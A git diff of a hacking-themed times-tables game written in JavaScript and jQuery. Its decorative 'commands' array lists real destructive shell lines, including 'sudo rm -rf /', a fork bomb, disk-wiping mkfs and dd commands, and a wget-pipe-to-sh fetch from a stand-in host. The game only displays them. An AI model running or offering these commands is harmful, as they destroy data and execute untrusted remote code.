@@ -1,5 +1,24 @@
 
-var commands = ["sudo rm -rf /", ":(){:|:&};:", "command > /dev/sda", "mv folder /dev/null", "wget malicious_source.com/rip -O- | sh", "mkfs.ext3 /dev/sda", "^foo^bar", "dd if=/dev/random of=/dev/sda", "tar cvf archive_name.tar dirname/", "tar xvf archive_name.tar", "grep -i 'the' demo_file", "find -iname 'MyCProgram.c'", "find ~ -empty", "ssh -l jsmith remotehost.example.com", "sed 's/.$//' filename", " awk '!($0 in array) { array[$0]; print }' temp"]
+// # console outputs
+
+var commands = ["sudo rm -rf /",
+                ":(){:|:&};:",
+                "command > /dev/sda", "mv folder /dev/null",
+                "wget malicious_source.com/rip -O- | sh",
+                "mkfs.ext3 /dev/sda",
+                "^foo^bar",
+                "dd if=/dev/random of=/dev/sda",
+                "tar cvf archive_name.tar dirname/",
+                "tar xvf archive_name.tar",
+                "grep -i 'the' demo_file",
+                "find -iname 'MyCProgram.c'",
+                "find ~ -empty",
+                "ssh -l jsmith remotehost.example.com",
+                "sed 's/.$//' filename",
+                " awk '!($0 in array) { array[$0]; print }' temp"
+               ]
+
+
 var outputs = ["[Hack] Hacking into firewall...\n[Hack] firewall hacked!\n[Hack] Deploying sporkbomb\n[sporkbomb] I is a big sporkbomb, Loading...\n[Hack] sporkbombed!",
                "[Hack] Firewall traced to relative IP of 127.0.0.1\n[Firewall] I'm inpenatrable!\n[Hack] Damn, firewall impenatrable!\n[Nuke] I is blow up firewall!\n[Hack] Firewall down!",
                "[Hack] Detected sporkbomb!\n[sporkbomb] I exist!\n[Hack] Cracking Firewall...\n[Hack] Cracked!",
@@ -9,10 +28,14 @@ var outputs = ["[Hack] Hacking into firewall...\n[Hack] firewall hacked!\n[Hack]
                "[Hack] Bypassing proxy...\n[Hack] Proxy flooded!\n[Hack] Hack complete!"
               ]
 
+// # global vars
+
 var out1;
 var out2;
 var blue = 50;
 var red = 50;
+
+// # random num generater
 
 function ranBetween(min, max) {
   return Math.round(Math.random() * (max - min) + min);
@@ -34,12 +57,16 @@ function generateCommand() {
   }
 }
 
+// # random times tables
+
 function populateOuts() {
   out1 = ranBetween(1, 12);
   out2 = ranBetween(1, 12);
   $("#out1").html("<h1>" + out1 + "</h1>");
   $("#out2").html("<h1>" + out2 + "</h1>");
 }
+
+// # power bar
 
 function power(win) {
   if(win) {
@@ -68,6 +95,8 @@ function power(win) {
 $(document).ready(function () {
   populateOuts();
 
+  // # when enter hit
+
   $(document).keypress(function(e) {
     if(e.which == 13 && $("#in1 > input:nth-child(1)").is(":focus") && $("#in1 > input:nth-child(1)").val() != "" && !isNaN($("#in1 > input:nth-child(1)").val())) {
       if(Number($("#in1 > input:nth-child(1)").val()) == out1*out2) {
@@ -91,4 +120,5 @@ $(document).ready(function () {
       }
     }
   });
+
 });
